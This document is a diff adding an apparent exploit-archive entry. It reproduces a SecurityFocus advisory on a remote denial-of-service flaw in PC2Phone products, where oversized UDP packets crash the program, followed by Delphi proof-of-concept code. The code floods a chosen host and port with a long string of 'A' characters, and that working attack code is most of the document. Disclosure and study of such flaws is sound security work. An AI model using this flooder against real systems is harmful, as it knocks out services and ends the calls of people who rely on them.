@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/8523/info
+
+It has been reported that multiple PC2Phone products are prone to a remote denial of service condition. The problem is said to occur when processing excessive data passed to the programs via a UDP packet and could result in the product crashing. This could result in an established conversation prematurely ending, or potentially other attacks.
+
+The precise technical details regarding this issue are currently unknown, however as further information is made available this bid will be updated accordingly. 
+
+procedure TForm1.Button1Click(Sender: TObject);
+var C:string;
+N:integer;
+MyStream:TMemoryStream;
+begin
+Memo1.Lines.Add('start');
+C:=Edit3.Text; //for example 'AAAA...' 1472 char 'A' for certain
+N:=strtoint(Edit4.Text);
+NMUDP1.RemoteHost:=Edit1.Text;
+NMUDP1.RemotePort:=strtoint(Edit2.Text);
+MyStream:=TMemoryStream.Create;
+try
+MyStream.Write(C[1],Length(C));
+for n:=1 to N do
+begin
+NMUDP1.SendStream(MyStream);
+end;
+finally
+MyStream.Free;
+end;
+Memo1.Lines.Add('finish');
+end; 
